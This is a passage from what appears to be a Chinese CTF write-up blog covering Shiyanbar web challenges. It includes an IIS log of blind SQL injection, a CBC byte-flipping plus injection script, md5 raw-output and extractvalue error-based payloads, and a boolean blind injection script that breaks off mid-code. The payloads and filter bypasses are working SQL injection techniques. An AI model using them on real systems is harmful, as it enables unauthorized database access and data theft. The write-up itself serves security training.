tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;53 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br></pre></td></tr></table></figure><p>利用二分法一位一位分析，最后得到8位的ascii值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">53</span>)</span><br><span class="line"><span class="string">'5'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">50</span>)</span><br><span class="line"><span class="string">'2'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">99</span>)</span><br><span class="line"><span class="string">'c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">53</span>)</span><br><span class="line"><span class="string">'5'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">102</span>)</span><br><span class="line"><span class="string">'f'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">49</span>)</span><br><span class="line"><span class="string">'1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">100</span>)</span><br><span class="line"><span class="string">'d'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">54</span>)</span><br><span class="line"><span class="string">'6'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>拼接得flag:52c5f1d6</p><h3 id="花式绕waf"><a href="#花式绕waf" class="headerlink" title="花式绕waf"></a>花式绕waf</h3><p>扫描后台得到<a href="http://www.zip文件，获得源代码，考察sql注入" target="_blank" rel="noopener">www.zip文件，获得源代码，考察sql注入</a></p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>实验吧Web</title>
    <link href="https://Foxgrin.github.io//posts/65109/"/>
    <id>https://Foxgrin.github.io//posts/65109/</id>
    <published>2018-09-13T06:34:00.000Z</published>
    <updated>2018-09-17T12:35:12.755Z</updated>
    
    <content type="html"><![CDATA[<p>实验吧Web题解<a id="more"></a></p><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/jiandan/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/jiandan/index.php</a></p><p>burp抓包发现响应包头部tips:test.php</p><p>test.php给出了index.php的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define(&quot;SECRET_KEY&quot;, &apos;***********&apos;); </span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); </span><br><span class="line">error_reporting(0); </span><br><span class="line">include(&apos;conn.php&apos;); </span><br><span class="line">function sqliCheck($str)&#123; </span><br><span class="line">if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123; </span><br><span class="line">return 1; </span><br><span class="line">&#125; </span><br><span class="line">return 0; </span><br><span class="line">&#125; </span><br><span class="line">function get_random_iv()&#123; </span><br><span class="line">$random_iv=&apos;&apos;; </span><br><span class="line">for($i=0;$i&lt;16;$i++)&#123; </span><br><span class="line">$random_iv.=chr(rand(1,255)); </span><br><span class="line">&#125; </span><br><span class="line">return $random_iv; </span><br><span class="line">&#125; </span><br><span class="line">function login($info)&#123; </span><br><span class="line">$iv = get_random_iv(); </span><br><span class="line">$plain = serialize($info); </span><br><span class="line">$cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); </span><br><span class="line">setcookie(&quot;iv&quot;, base64_encode($iv)); </span><br><span class="line">setcookie(&quot;cipher&quot;, base64_encode($cipher)); </span><br><span class="line">&#125; </span><br><span class="line">function show_homepage()&#123; </span><br><span class="line">global $link; </span><br><span class="line">if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; </span><br><span class="line">$cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); </span><br><span class="line">$iv = base64_decode($_COOKIE[&quot;iv&quot;]); </span><br><span class="line">if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; </span><br><span class="line">$info = unserialize($plain) or die(&quot;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&quot;); </span><br><span class="line">$sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;; </span><br><span class="line">$result=mysqli_query($link,$sql); </span><br><span class="line">if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123; </span><br><span class="line">$rows=mysqli_fetch_array($result); </span><br><span class="line">echo &apos;Hello!&apos;.$rows[&apos;username&apos;].&apos;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">echo &apos;Hello!&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">die(&quot;ERROR!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">if(isset($_POST[&apos;id&apos;]))&#123; </span><br><span class="line">$id = (string)$_POST[&apos;id&apos;]; </span><br><span class="line">if(sqliCheck($id)) </span><br><span class="line">die(&quot;sql inject detected!&quot;); </span><br><span class="line">$info = array(&apos;id&apos;=&gt;$id); </span><br><span class="line">login($info); </span><br><span class="line">echo &apos;Hello!&apos;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123; </span><br><span class="line">show_homepage(); </span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计代码，首先对我们post的参数id进行了sql语句关键词过滤，其中过滤了union，逗号，#，=，-，like，然后通过过滤后对数组plain进行cbc加密，加密后的值cipher和随机16位字符串iv存储在cookie对应的字段中，最终将cbc解密的id值执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="string">".$info['id']."</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure><p>可见，不管我们给id赋值1,2,3等，最终经过limit id,0后都得不到查询结果。我们要进行sql注入的话，就必须将后面的0注释掉，但是这里过滤掉了注释符#，–，所以用%00代替注释</p><p>给个payload:1;%00，通过burp先post id=1;%00，再将得到的cookie加入请求头的cookie字段，然后再访问，但是这里可能是php或者mysql修复了%00截断，因为直接输入1;%00依然无法实现截断 </p><p>以下这段话参考别人的文章：</p><p>%00截断并不是字面意义上的截断，而是指%00经过urldecode之后会变成空字符\0，我们知道在c语言中\0是字符串的结尾，所以\0之后的字符就被截断了。所以，在本道题中不能直接输入1;%00，因为这样会被编码成1%3B%2500，需要用burpsuit抓包后修改为1%3B%00，然后再post才能成功截断。 </p><p>试着post id=1%3B%00</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功得到用户名信息</p><p>那么我们继续执行注入，必须用到union，但是这里过滤了union，所以我们通过cbc字节翻转的方式，具体cbc字节翻转攻击原理就不具体说了，可以参考我之前的文章。此外，还过滤了逗号，那么我们可以用连接关键词join</p><p>下面直接给出payloads</p><p>注数据库名的payload:0 Anion select * from ((select 1)a join (select database())b join (select 3)c);%00</p><p>注表名的payload:0 Anion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c);%00</p><p>注列名的payload:0 Anion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name=’you_want’)b join (select 3)c);%00</p><p>注数据的payload:0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);”%00</p><p>下面给出最后注出flag的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/jiandan/index.php"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'id'</span>: <span class="string">"0 Anion select * from ((select 1)a join (select group_concat(value) from you_want)b join (select 3)c);"</span>+chr(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">r1 = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(r1.cookies)</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cookies[<span class="string">'cipher'</span>]))</span><br><span class="line">index = <span class="number">7</span></span><br><span class="line">new_cipher = cipher[:index] + chr(ord(cipher[index])^ord(<span class="string">'A'</span>)^ord(<span class="string">'u'</span>)) + cipher[index+<span class="number">1</span>:]</span><br><span class="line">new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">cookies[<span class="string">'cipher'</span>] = new_cipher</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url,cookies=cookies)</span><br><span class="line">plain = base64.b64decode(re.findall(<span class="string">"base64_decode\('(.*)'\)"</span>,r2.text)[<span class="number">0</span>])</span><br><span class="line">iv = base64.b64decode(urllib.unquote(cookies[<span class="string">'iv'</span>]))</span><br><span class="line">target = <span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">new_iv = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">new_iv = new_iv + chr(ord(iv[i])^ord(plain[i])^ord(target[i]))</span><br><span class="line">cookies[<span class="string">'iv'</span>] = urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line"></span><br><span class="line">r3 = requests.get(url,cookies=cookies)</span><br><span class="line">r3.encoding = r3.apparent_encoding</span><br><span class="line"><span class="keyword">print</span> r3.text</span><br></pre></td></tr></table></figure><p>说明一下在python中chr(0)代表空字符的意思，而我们要进行截断都是通过空字符来截断</p><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[&apos;password&apos;];</span><br><span class="line">$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line">if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">echo &apos;flag is :&apos;.$flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;密码错误!&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对参数password进行了md5加密，看似不能进行sql注入，但是这里md5函数里出现参数true，查询一下md5参数加入了参数true，得到的是原始16位的二进制数</p><p>在本地测试了一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str,<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>二进制数在浏览器上显示时会转化为字符串</p><p>所以我们进行注入的话，就必须要想办法让md5加密后是’or 6的形式</p><p>这里直接拿别人得到的字符串： ffifdyop </p><p><img src="/img/实验吧Web/4.png" alt=""></p><p>可以看到加密后的字符串为’or’6É]™é!r,ùíb</p><p>拼接到sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">WHERE</span> username = <span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'".'</span> <span class="keyword">or</span> <span class="string">'6É]™é!r,ùíb."'</span></span><br></pre></td></tr></table></figure><p>语句恒真，始终有查询结果，成功注出flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p><p>源代码提示了需要post参数username和password</p><p>还给出了sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure><p>使用万能密码登录admin用户,username=admin&amp;password=’ or ‘1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录成功，但没有给出flag，说明要进行题目说的报错注入才能得到flag</p><p>尝试在username参数进行报错注入，但发现过了括号，注释符#，–，%3B%00</p><p>但是行注释符没有被过滤，我们可以通过行注释符注释掉中间的’ and password=’进行注入</p><p>得出payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; /*&amp;password=*/ or &apos;</span><br></pre></td></tr></table></figure><p>拼接后相当于执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="comment">/*and password='*/</span> <span class="keyword">or</span> <span class="string">''</span></span><br></pre></td></tr></table></figure><p>在本地数据库演示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么使用在username中使用extract，在password中使用括号，再通过行注释符注释中间，最终拼接成完成的extractvalue注入，就是我们的目的</p><p>先注出数据库</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select database()),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注表名</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>猜测flag可能在表ffll44jj中</p><p>注列名</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注数据</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="认真一点"><a href="#认真一点" class="headerlink" title="认真一点"></a>认真一点</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/earnest/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/earnest/index.php</a></p><p>输入id=1，页面返回You are in…，输入id等于其他值都返回You are not in，输入id=1’，返回You are not in，输入id=1”，返回You are in，猜测id可能被单引号包裹</p><p>那么我们可以根据返回信息的不同进行基于布尔的注入，但是经过测试，这题过滤了注释符，空格，逗号,substr，同时将or替换为空字符串，替换的解决方法是双写or绕过，过滤了空格可以用括号代替，substr用mid代替，过滤了逗号，可以用mid from  for</p><p>给出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/earnest/index.php"</span></span><br><span class="line">all_string = <span class="string">'''qwertyuiopasdfghjklzxcvbnm `~1234567890!@#$%^&amp;*()-_=+[&#123;]&#125;;:'"\|&lt;,&gt;.?/QWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:ctf_sql_bool_blind</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((database())from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of database is: "</span>+j)</span><br><span class="line">            database = database + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"database: "</span>+database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据表名:fiag,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of table_name is: "</span>+j)</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"table_name: "</span>+table_name)</span><br><span class="line"><span class="comment">#获取fiag下列名:fL$4G</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span 